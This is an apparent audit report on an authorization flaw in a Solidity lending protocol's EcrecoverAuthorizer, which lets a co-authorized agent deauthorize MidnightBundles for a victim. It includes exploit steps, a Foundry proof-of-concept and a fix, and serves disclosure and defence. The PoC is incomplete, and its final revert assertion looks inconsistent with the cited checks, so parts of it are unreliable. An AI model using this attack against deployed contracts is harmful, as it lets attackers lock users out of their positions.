### Title
Co-authorized agent can deauthorize MidnightBundles via EcrecoverAuthorizer, causing permanent DoS on all bundled operations - (File: src/periphery/EcrecoverAuthorizer.sol)

### Summary
`EcrecoverAuthorizer.setIsAuthorized` permits any currently-authorized agent of a victim to sign and submit an `Authorization` struct that modifies the victim's authorization mappings, including revoking other agents such as `MidnightBundles`. Because the signer check accepts `IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer)` as sufficient authority, a co-authorized attacker can deauthorize `MidnightBundles` without the victim's knowledge or consent. All subsequent `MidnightBundles` bundled operations for that victim will revert with `Unauthorized`.

### Finding Description

**Root cause — `EcrecoverAuthorizer.setIsAuthorized` lines 33–36:**

```solidity
require(
    signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
    Unauthorized()
);
``` [1](#0-0) 

The second branch of the `||` allows any address that is already authorized by `authorization.authorizer` to act as the authorizer for the purpose of changing that authorizer's authorization mappings. There is no restriction on what `authorization.authorized` or `authorization.isAuthorized` may be — the signer can freely set any target to `false`.

**Exploit flow:**

1. Victim calls `Midnight.setIsAuthorized(MidnightBundles, true, victim)` and `Midnight.setIsAuthorized(attacker, true, victim)` — both are now authorized agents of victim.
2. Attacker constructs `Authorization(authorizer=victim, authorized=MidnightBundles, isAuthorized=false, nonce=currentNonce[victim], deadline=future)` and signs it with the attacker's private key.
3. Attacker calls `EcrecoverAuthorizer.setIsAuthorized(authorization, attackerSignature)`.
4. `ecrecover` returns `attacker`; the check `IMidnight(MIDNIGHT).isAuthorized(victim, attacker) == true` passes.
5. `IMidnight(MIDNIGHT).setIsAuthorized(MidnightBundles, false, victim)` executes, revoking `MidnightBundles` for victim. [2](#0-1) 

**Why existing checks fail:**

- The nonce check (line 26) only prevents replay; it does not restrict which `authorized` address or which `isAuthorized` value the signer may set.
- The deadline check (line 25) is irrelevant to the authorization scope.
- There is no check that `authorization.authorized != someProtectedAddress` or that the signer may only modify their own authorization entry. [3](#0-2) 

**Downstream revert in MidnightBundles:**

Every bundled entry point checks:

```solidity
require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
``` [4](#0-3) [5](#0-4) [6](#0-5) [7](#0-6) 

After step 5, `isAuthorized(victim, MidnightBundles) == false`, so every call with `taker=victim` reverts.

### Impact Explanation
Any victim who has authorized both `MidnightBundles` and at least one other address (e.g., a trading bot, a UI relayer, or any other agent) can have `MidnightBundles` deauthorized by that co-authorized address. This permanently blocks `buyWithUnitsTargetAndWithdrawCollateral`, `buyWithAssetsTargetAndWithdrawCollateral`, `supplyCollateralAndSellWithUnitsTarget`, `supplyCollateralAndSellWithAssetsTarget`, and `repayAndWithdrawCollateral` for the victim until the victim re-authorizes `MidnightBundles` — which can be griefed again immediately at zero cost.

### Likelihood Explanation
- **Precondition:** Victim has authorized both `MidnightBundles` and at least one other address. This is the normal operating state for any user of the bundler who also uses any other authorized agent (e.g., a keeper, a UI relayer, or a second wallet).
- **Attacker cost:** Only gas for one `setIsAuthorized` call. No capital required.
- **Repeatability:** The attacker can re-execute every time the victim re-authorizes `MidnightBundles`, making the DoS indefinitely sustainable.
- **Detection difficulty:** The event `SetIsAuthorized` is emitted but the victim has no on-chain protection against it. [8](#0-7) 

### Recommendation
Restrict the signer's authority so that a co-authorized agent may only modify their **own** authorization entry (i.e., only deauthorize themselves). Concretely, add a check after the signer recovery:

```solidity
if (signer != authorization.authorizer) {
    require(signer == authorization.authorized, Unauthorized());
}
```

This ensures that a delegated signer can only revoke their own access, not that of any other agent. Alternatively, remove the delegated-signer path entirely and require that only `authorization.authorizer` themselves can sign authorization changes through this contract.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {EcrecoverAuthorizer, Authorization, Signature} from "src/periphery/EcrecoverAuthorizer.sol";
import {MidnightBundles} from "src/periphery/MidnightBundles.sol";
import {IMidnight} from "src/interfaces/IMidnight.sol";

contract DeauthorizeMidnightBundlesTest is Test {
    EcrecoverAuthorizer authorizer;
    MidnightBundles bundles;
    address midnight; // deployed Midnight core

    uint256 attackerKey = 0xA11CE;
    address attacker    = vm.addr(attackerKey);
    address victim;
    uint256 victimKey   = 0xB0B;

    function setUp() public {
        victim = vm.addr(victimKey);
        // deploy Midnight, EcrecoverAuthorizer, MidnightBundles
        // victim authorizes MidnightBundles and attacker on Midnight core
        vm.prank(victim);
        IMidnight(midnight).setIsAuthorized(address(bundles), true, victim);
        vm.prank(victim);
        IMidnight(midnight).setIsAuthorized(attacker, true, victim);
    }

    function test_coAuthorizedAgentDeauthorizesMidnightBundles() public {
        // Precondition: both authorized
        assertTrue(IMidnight(midnight).isAuthorized(victim, address(bundles)));
        assertTrue(IMidnight(midnight).isAuthorized(victim, attacker));

        // Attacker signs Authorization(authorizer=victim, authorized=bundles, isAuthorized=false, nonce=0)
        Authorization memory auth = Authorization({
            authorizer:   victim,
            authorized:   address(bundles),
            isAuthorized: false,
            nonce:        authorizer.nonce(victim),
            deadline:     block.timestamp + 1 days
        });

        bytes32 domainSep = keccak256(abi.encode(
            0x47e79534a245952e8b16893a336b85a3d9ea9fa8c573f3d803afb92a79469218,
            block.chainid,
            address(authorizer)
        ));
        bytes32 digest = keccak256(bytes.concat(
            "\x19\x01",
            domainSep,
            keccak256(abi.encode(
                0x81d0284fb0e2cde18d0553b06189d6f7613c96a01bb5b5e7828eade6a0dcac91,
                auth
            ))
        ));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerKey, digest);

        vm.prank(attacker);
        authorizer.setIsAuthorized(auth, Signature(v, r, s));

        // Assert: MidnightBundles is now deauthorized for victim
        assertFalse(IMidnight(midnight).isAuthorized(victim, address(bundles)));

        // Assert: bundled take reverts with Unauthorized
        vm.expectRevert(MidnightBundles.Unauthorized.selector);
        vm.prank(attacker); // any caller != victim
        bundles.buyWithUnitsTargetAndWithdrawCollateral(
            /* targetUnits */ 1, /* maxBuyerAssets */ 1e18, victim,
            /* loanTokenPermit */ emptyPermit(),
            /* takes */ buildTakes(),
            /* collateralWithdrawals */ new CollateralWithdrawal[](0),
            /* collateralReceiver */ victim,
            /* referralFeePct */ 0,
            /* referralFeeRecipient */ address(0)
        );
    }
}
```

**Expected assertions:**
- `assertFalse(IMidnight(midnight).isAuthorized(victim, address(bundles)))` — passes after attacker's call.
- `vm.expectRevert(MidnightBundles.Unauthorized.selector)` — `buyWithUnitsTargetAndWithdrawCollateral` reverts because `isAuthorized(victim, MidnightBundles) == false`.

### Citations

**File:** src/periphery/EcrecoverAuthorizer.sol (L24-36)
```text
    function setIsAuthorized(Authorization memory authorization, Signature calldata signature) external {
        require(block.timestamp <= authorization.deadline, Expired());
        require(authorization.nonce == nonce[authorization.authorizer]++, InvalidNonce());

        bytes32 hashStruct = keccak256(abi.encode(AUTHORIZATION_TYPEHASH, authorization));
        bytes32 domainSeparator = keccak256(abi.encode(EIP712_DOMAIN_TYPEHASH, block.chainid, address(this)));
        bytes32 digest = keccak256(bytes.concat("\x19\x01", domainSeparator, hashStruct));
        address signer = ecrecover(digest, signature.v, signature.r, signature.s);
        require(signer != address(0), InvalidSignature());
        require(
            signer == authorization.authorizer || IMidnight(MIDNIGHT).isAuthorized(authorization.authorizer, signer),
            Unauthorized()
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L38-44)
```text
        emit SetIsAuthorized(
            msg.sender,
            authorization.authorizer,
            authorization.authorized,
            authorization.isAuthorized,
            authorization.nonce
        );
```

**File:** src/periphery/EcrecoverAuthorizer.sol (L46-48)
```text
        IMidnight(MIDNIGHT)
            .setIsAuthorized(authorization.authorized, authorization.isAuthorized, authorization.authorizer);
    }
```

**File:** src/periphery/MidnightBundles.sol (L60-60)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L127-127)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L191-191)
```text
        require(taker == msg.sender || IMidnight(MIDNIGHT).isAuthorized(taker, msg.sender), Unauthorized());
```

**File:** src/periphery/MidnightBundles.sol (L325-325)
```text
        require(onBehalf == msg.sender || IMidnight(MIDNIGHT).isAuthorized(onBehalf, msg.sender), Unauthorized());
```
